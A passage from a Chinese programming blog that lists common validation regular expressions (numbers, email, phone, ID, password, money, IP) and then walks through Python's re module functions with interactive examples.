<code>^\+?[1-9][0-9]*$</code></p></li><li><p>非零的负整数：<code>^\-[1-9][]0-9&quot;*$</code> 或 <code>^-[1-9]\d*$</code></p></li><li><p>非负整数：<code>^\d+$</code> 或 <code>^[1-9]\d*|0$</code></p></li><li><p>非正整数：<code>^-[1-9]\d*|0$</code> 或 <code>^((-\d+)|(0+))$</code></p></li><li><p>非负浮点数：<code>^\d+(\.\d+)?$</code> 或 <code>^[1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0$</code></p></li><li><p>非正浮点数：<code>^((-\d+(\.\d+)?)|(0+(\.0+)?))$</code> 或                                                                <code>^(-([1-9]\d*\.\d*|0\.\d*[1-9]\d*))|0?\.0+|0$</code></p></li><li><p>正浮点数：<code>^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$</code> 或                                                                        <code>^(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$</code></p></li><li><p>负浮点数：<code>^-([1-9]\d*\.\d*|0\.\d*[1-9]\d*)$</code> 或 <code>^(-(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*)))$</code></p></li><li><p>浮点数：<code>^(-?\d+)(\.\d+)?$</code> 或 <code>^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$</code></p></li></ol><h3 id="二、校验字符的表达式"><a href="#二、校验字符的表达式" class="headerlink" title="二、校验字符的表达式"></a>二、校验字符的表达式</h3><ol><li><p>汉字：<code>^[\u4e00-\u9fa5]{0,}$</code></p></li><li><p>英文和数字：<code>^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]{4,40}$</code></p></li><li><p>长度为3-20的所有字符：<code>^.{3,20}$</code></p></li><li><p>由26个英文字母组成的字符串：<code>^[A-Za-z]+$</code></p></li><li><p>由26个大写英文字母组成的字符串：<code>^[A-Z]+$</code></p></li><li><p>由26个小写英文字母组成的字符串：<code>^[a-z]+$</code></p></li><li><p>由数字和26个英文字母组成的字符串：<code>^[A-Za-z0-9]+$</code></p></li><li><p>由数字、26个英文字母或者下划线组成的字符串：<code>^\w+$ 或 ^\w{3,20}$</code></p></li><li><p>中文、英文、数字包括下划线：<code>^[\u4E00-\u9FA5A-Za-z0-9_]+$</code></p></li><li><p>中文、英文、数字但不包括下划线等符号：<code>^[\u4E00-\u9FA5A-Za-z0-9]+$</code>或                                           <code>^[\u4E00-\u9FA5A-Za-z0-9]{2,20}$</code></p></li></ol><ol start="11"><li>可以输入含有^%&amp;’,;=?$\”等字符：<code>[^%&amp;&#39;,;=?$\x22]+ 12</code> </li><li>禁止输入含有~的字符：<code>[^~\x22]+</code></li></ol><h3 id="三、特殊需求表达式"><a href="#三、特殊需求表达式" class="headerlink" title="三、特殊需求表达式"></a>三、特殊需求表达式</h3><ol><li><p>Email地址：<code>^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$</code></p></li><li><p>域名：<code>[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.?</code></p></li><li><p>InternetURL：<code>[a-zA-z]+://[^\s]*</code> 或  <code>^http://([\w-]+\.)+[\w-]+(/[\w-./?%&amp;=]*)?$</code></p></li><li><p>手机号码：<code>^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d{8}$</code></p></li><li><p>电话号码(“XXX-XXXXXXX”、”XXXX-XXXXXXXX”、”XXX-XXXXXXX”、”XXX-XXXXXXXX”、”XXXXXXX”和”XXXXXXXX)：<code>^(\(\d{3,4}-)|\d{3.4}-)?\d{7,8}$</code></p></li><li><p>国内电话号码(0511-4405222、021-87888822)：<code>\d{3}-\d{8}|\d{4}-\d{7}</code></p></li><li><p>身份证号(15位、18位数字)：<code>^\d{15}|\d{18}$</code></p></li><li><p>短身份证号码(数字、字母x结尾)：<code>^([0-9]){7,18}(x|X)?$</code>或<code>^\d{8,18}|[0-9x]{8,18}|[0-9X]{8,18}?$</code></p></li><li><p>帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：<code>^[a-zA-Z][a-zA-Z0-9_]{4,15}$</code></p></li></ol><ol start="10"><li><p>密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：<code>^[a-zA-Z]\w{5,17}$</code></p></li><li><p>强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：                <code>^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$</code></p></li></ol><ol start="12"><li><p>日期格式：<code>^\d{4}-\d{1,2}-\d{1,2}</code></p></li><li><p>一年的12个月(01～09和1～12)：<code>^(0?[1-9]|1[0-2])$</code></p></li><li><p>一个月的31天(01～09和1～31)：<code>^((0?[1-9])|((1|2)[0-9])|30|31)$</code></p></li></ol><ol start="15"><li><p>钱的输入格式：</p><p>有四种钱的表示形式我们可以接受:”10000.00” 和 “10,000.00”, 和没有 “分” 的 “10000” 和 “10,000”：<code>^[1-9][0-9]*$</code></p><p>这表示任意一个不以0开头的数字,但是,这也意味着一个字符”0”不通过,所以我们采用下面的形式：<code>^(0|[1-9][0-9]*)$</code></p><p>一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：<code>^(0|-?[1-9][0-9]*)$</code></p><p>这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：<code>^[0-9]+(.[0-9]+)?$</code></p><p>必须说明的是,小数点后面至少应该有1位数,所以”10.”是不通过的,但是 “10” 和 “10.2” 是通过的：<code>^[0-9]+(.[0-9]{2})?$</code></p><p>这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：<code>^[0-9]+(.[0-9]{1,2})?$</code></p><p>这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：                            <code>^[0-9]{1,3}(,[0-9]{3})*(.[0-9]{1,2})?$</code></p><p>到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须：                                               <code>^([0-9]+|[0-9]{1,3}(,[0-9]{3})*)(.[0-9]{1,2})?$</code></p><p>备注：这就是最终结果了,别忘了”+”可以用”*”替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里</p></li></ol><ol start="16"><li><p>xml文件：<code>^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\.[x|X][m|M][l|L]$</code></p></li><li><p>中文字符的正则表达式：<code>[\u4e00-\u9fa5]</code></p></li><li><p>双字节字符：<code>[^\x00-\xff]</code> (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1))</p></li><li>空白行的正则表达式：<code>\n\s*\r</code>(可以用来删除空白行)*</li><li>HTML标记的正则表达式：<code>&lt;(\S*?)[^&gt;]*&gt;.*?&lt;/\1&gt;|&lt;.*? /&gt;</code> (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力)</li><li>首尾空白字符的正则表达式：<code>^\s*|\s*$</code>或 <code>(^\s*)|(\s*$)</code> (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式)</li><li>腾讯QQ号：<code>[1-9][0-9]{4,}</code> (腾讯QQ号从10000开始)</li><li>中国邮政编码：<code>[1-9]\d{5}(?!\d)</code> (中国邮政编码为6位数字)</li><li>IP地址：<code>\d+\.\d+\.\d+\.\d+</code> (提取IP地址时有用)</li><li>IP地址：<code>((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d))</code></li></ol><h2 id="Python-re模块"><a href="#Python-re模块" class="headerlink" title="Python re模块"></a>Python re模块</h2><p>人生苦短，不如Python。</p><blockquote><p>引用：<a href="https://blog.csdn.net/jamfiy/article/details/88139202" target="_blank" rel="noopener">python基础—re模块—正则表达式</a></p></blockquote><p>python从1.5版本起增加re模块为自带的模块，提供了Perl风格的正则表达式模式</p><p>以下是python re库的常用函数</p><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">compile(pattern[, flags])</td><td style="text-align:center">根据包含正则表达式的字符串创建模式对象</td></tr><tr><td style="text-align:center">search(pattern, string[, flags])</td><td style="text-align:center">在字符串中查找模式</td></tr><tr><td style="text-align:center">match(pattern, string[, flags])</td><td style="text-align:center">在字符串开头匹配模式</td></tr><tr><td style="text-align:center">split(pattern, string[, maxsplit=0])</td><td style="text-align:center">根据模式来分割字符串</td></tr><tr><td style="text-align:center">findall(pattern, string)</td><td style="text-align:center">返回一个列表，其中包含字符串中所有与模式匹配的子串</td></tr><tr><td style="text-align:center">sub(pat, repl, string[, count=0])</td><td style="text-align:center">将字符串中与模式pat匹配的子串都替换为repl</td></tr><tr><td style="text-align:center">escape(string)</td><td style="text-align:center">对字符串中所有的正则表达式特殊字符都进行转义</td></tr></tbody></table><ul><li><h4 id="re-compile"><a href="#re-compile" class="headerlink" title="re.compile()"></a>re.compile()</h4></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。</span><br><span class="line"></span><br><span class="line">语法格式为：</span><br><span class="line"></span><br><span class="line">re.compile(pattern[, flags])</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;<span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pattern = re.compile(<span class="string">r'\d+'</span>) <span class="comment"># 用于匹配至少一个数字</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = pattern.match(<span class="string">'one12twothree34four'</span>) <span class="comment"># 查找头部，没有匹配</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(m)</span><br><span class="line"></span><br><span class="line"><span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = pattern.match(<span class="string">'one12twothree34four'</span>, <span class="number">2</span>, <span class="number">10</span>) <span class="comment"># 从'e'的位置开始匹配，没有匹配</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(m)</span><br><span class="line"></span><br><span class="line"><span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = pattern.match(<span class="string">'one12twothree34four'</span>, <span class="number">3</span>, <span class="number">10</span>) <span class="comment"># 从'1'的位置开始匹配，正好匹配 &gt;&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">print(m) <span class="comment"># 返回一个 Match 对象</span></span><br><span class="line">&lt;_sre.SRE_Match object at <span class="number">0x10a42aac0</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">0</span>) <span class="comment"># 可省略 0 '12'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.start(<span class="number">0</span>) <span class="comment"># 可省略 0 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.end(<span class="number">0</span>) <span class="comment"># 可省略 0 5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.span(<span class="number">0</span>) <span class="comment"># 可省略 0 (3, 5)</span></span><br><span class="line"></span><br><span class="line">在上面，当匹配成功时返回一个 Match 对象，其中：</span><br><span class="line"></span><br><span class="line">group([group1, …]) 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 group() 或 group(<span class="number">0</span>)；</span><br><span class="line">start([group]) 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 <span class="number">0</span>；</span><br><span class="line">end([group]) 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+<span class="number">1</span>），参数默认值为 <span class="number">0</span>；</span><br><span class="line">span([group]) 方法返回 (start(group), end(group))。</span><br><span class="line">再看看一个例子：</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;<span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pattern = re.compile(<span class="string">r'([a-z]+) ([a-z]+)'</span>, re.I) <span class="comment"># re.I 表示忽略大小写</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = pattern.match(<span class="string">'Hello World Wide Web'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(m)<span class="comment"># 匹配成功，返回一个 Match 对象</span></span><br><span class="line">&lt;_sre.SRE_Match object at <span class="number">0x10bea83e8</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">0</span>) <span class="comment"># 返回匹配成功的整个子串 'Hello World'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.span(<span class="number">0</span>) <span class="comment"># 返回匹配成功的整个子串的索引 (0, 11)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">1</span>) <span class="comment"># 返回第一个分组匹配成功的子串 'Hello'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.span(<span class="number">1</span>) <span class="comment"># 返回第一个分组匹配成功的子串的索引 (0, 5)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">2</span>) <span class="comment"># 返回第二个分组匹配成功的子串 'World'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.span(<span class="number">2</span>) <span class="comment"># 返回第二个分组匹配成功的子串 (6, 11)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.groups() <span class="comment"># 等价于 (m.group(1), m.group(2), ...) ('Hello', 'World')</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">3</span>) <span class="comment"># 不存在第三个分组</span></span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">IndexError: no such group</span><br></pre></td></tr></table></figure><ul><li><h4 id="re-search-amp-re-match"><a href="#re-search-amp-re-match" class="headerlink" title="re.search()&amp;re.match()"></a>re.search()&amp;re.match()</h4></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">re.search 扫描整个字符串并返回第一个成功的匹配。</span><br><span class="line"></span><br><span class="line">函数语法：</span><br><span class="line"></span><br><span class="line">re.search(pattern, string, flags=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">函数参数说明：</span><br><span class="line"></span><br><span class="line">pattern:匹配的正则表达式</span><br><span class="line">string:要匹配的字符串。</span><br><span class="line">flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">匹配成功re.search方法返回一个匹配的对象，否则返回<span class="literal">None</span>。</span><br><span class="line"></span><br><span class="line">我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。</span><br><span class="line"></span><br><span class="line">匹配对象方法</span><br><span class="line"></span><br><span class="line">group(num=<span class="number">0</span>):匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。</span><br><span class="line">groups():返回一个包含所有小组字符串的元组，从 <span class="number">1</span> 到 所含的小组号。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">line = <span class="string">"Cats are smarter than dogs"</span>;</span><br><span class="line">searchObj = re.search( <span class="string">r'(.*) are (.*?) .*'</span>, line, re.M|re.I)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> searchObj:</span><br><span class="line">      <span class="keyword">print</span> (<span class="string">"searchObj.group() : "</span>, searchObj.group())</span><br><span class="line">      <span class="keyword">print</span> (<span class="string">"searchObj.group(1) : "</span>, searchObj.group(<span class="number">1</span>))</span><br><span class="line">      <span class="keyword">print</span> (<span class="string">"searchObj.group(2) : "</span>, searchObj.group(<span class="number">2</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">      print( <span class="string">"Nothing found!!"</span>)</span><br><span class="line"></span><br><span class="line">以上实例执行结果如下：</span><br><span class="line"></span><br><span class="line">searchObj.group() : Cats are smarter than dogs</span><br><span class="line">searchObj.group(<span class="number">1</span>) : Cats</span><br><span class="line">searchObj.group(<span class="number">2</span>) : smarter</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。</span><br><span class="line"></span><br><span class="line">函数语法：</span><br><span class="line"></span><br><span class="line">re.match(pattern, string, flags=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">函数参数说明：（同re.search一样）</span><br><span class="line"></span><br><span class="line">匹配成功re.match方法返回一个匹配的对象，否则返回<span class="literal">None</span>。</span><br><span class="line"></span><br><span class="line">我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。</span><br><span class="line"></span><br><span class="line">匹配对象方法：（同re.search一样）</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">print(re.match(<span class="string">'www'</span>, <span class="string">'www.runoob.com'</span>).span()) <span class="comment"># 在起始位置匹配</span></span><br><span class="line">print(re.match(<span class="string">'com'</span>, <span class="string">'www.runoob.com'</span>)) <span class="comment"># 不在起始位置匹配</span></span><br><span class="line"></span><br><span class="line">以上实例运行输出结果为：</span><br><span class="line">(<span class="number">0</span>, <span class="number">3</span>) </span><br><span class="line"><span class="literal">None</span></span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">line = <span class="string">"Cats are smarter than dogs"</span></span><br><span class="line">matchObj = re.match( <span class="string">r'(.*) are (.*?) .*'</span>, line, re.M|re.I)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> matchObj:</span><br><span class="line">     print(<span class="string">"matchObj.group() : "</span>, matchObj.group())</span><br><span class="line">     print(<span class="string">"matchObj.group(1) : "</span>, matchObj.group(<span class="number">1</span>))</span><br><span class="line">     print(<span class="string">"matchObj.group(2) : "</span>, matchObj.group(<span class="number">2</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">     print(<span class="string">"No match!!"</span>)</span><br><span class="line"></span><br><span class="line">以上实例执行结果如下：</span><br><span class="line"></span><br><span class="line">matchObj.group() : Cats are smarter than dogs</span><br><span class="line">matchObj.group(<span class="number">1</span>) : Cats</span><br><span class="line">matchObj.group(<span class="number">2</span>) : smarter</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">____________________________________________________________________________</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">re.match与re.search的区别:</span><br><span class="line">re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回<span class="literal">None</span>；而re.search匹配整个字符串，直到找到一个匹配。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">line = <span class="string">"Cats are smarter than dogs"</span>;</span><br><span class="line">matchObj = re.match( <span class="string">r'dogs'</span>, line, re.M|re.I)</span><br><span class="line"><span class="keyword">if</span> matchObj:</span><br><span class="line">     print(<span class="string">"match --&gt; matchObj.group() : "</span>, matchObj.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">     <span class="keyword">print</span> (<span class="string">"No match!!"</span>)</span><br><span class="line">matchObj = re.search( <span class="string">r'dogs'</span>, line, re.M|re.I)</span><br><span class="line"><span class="keyword">if</span> matchObj:</span><br><span class="line">     print(<span class="string">"search --&gt; matchObj.group() : "</span>, matchObj.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">     print(<span class="string">"No match!!"</span>)</span><br><span class="line"></span><br><span class="line">以上实例运行结果如下：</span><br><span class="line"></span><br><span class="line">No match!!</span><br><span class="line">search --&gt; matchObj.group() : dogs</span><br></pre></td></tr></table></figure><ul><li><h4 id="re-split"><a href="#re-split" class="headerlink" title="re.split()"></a>re.split()</h4></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">split 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下：</span><br><span class="line"></span><br><span class="line">re.split(pattern, string[, maxsplit=<span class="number">0</span>, flags=<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">参数:</span><br><span class="line">pattern:匹配的正则表达式</span><br><span class="line">string:要匹配的字符串。</span><br><span class="line">maxsplit:分隔次数，maxsplit=<span class="number">1</span> 分隔一次，默认为 <span class="number">0</span>，不限制次数。</span><br><span class="line">flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;<span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">'\W+'</span>, <span class="string">'runoob, runoob, runoob.'</span>)</span><br><span class="line">[<span class="string">'runoob'</span>, <span class="string">'runoob'</span>, <span class="string">'runoob'</span>, <span class="string">''</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">'(\W+)'</span>, <span class="string">' runoob, runoob, runoob.'</span>)</span><br><span class="line">[<span class="string">''</span>, <span class="string">' '</span>, <span class="string">'runoob'</span>, <span class="string">', '</span>, <span class="string">'runoob'</span>, <span class="string">', '</span>, <span class="string">'runoob'</span>, <span class="string">'.'</span>, <span class="string">''</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">'\W+'</span>, <span class="string">' runoob, runoob, runoob.'</span>, <span class="number">1</span>)</span><br><span class="line">[<span class="string">''</span>, <span class="string">'runoob, runoob, runoob.'</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">'a*'</span>, <span class="string">'hello world'</span>) <span class="comment"># 对于一个找不到匹配的字符串而言，split 不会对其作出分割</span></span><br><span class="line">[<span class="string">'hello world'</span>]</span><br></pre></td></tr></table></figure><ul><li><h4 id="re-sub"><a href="#re-sub" class="headerlink" title="re.sub()"></a>re.sub()</h4></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Python 的 re 模块提供了re.sub用于替换字符串中的匹配项。</span><br><span class="line"></span><br><span class="line">语法:</span><br><span class="line">re.sub(pattern, repl, string, count=<span class="number">0</span>, flags=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">参数：</span><br><span class="line">pattern : 正则中的模式字符串。</span><br><span class="line">repl : 替换的字符串，也可为一个函数。</span><br><span class="line">string : 要被查找替换的原始字符串。</span><br><span class="line">count : 模式匹配后替换的最大次数，默认 <span class="number">0</span> 表示替换所有的匹配。</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">实例:</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">phone = <span class="string">"2004-959-559 # 这是一个国外电话号码"</span></span><br><span class="line">num = re.sub(<span class="string">r'#.*$'</span>, <span class="string">""</span>, phone)   <span class="comment"># 删除字符串中的 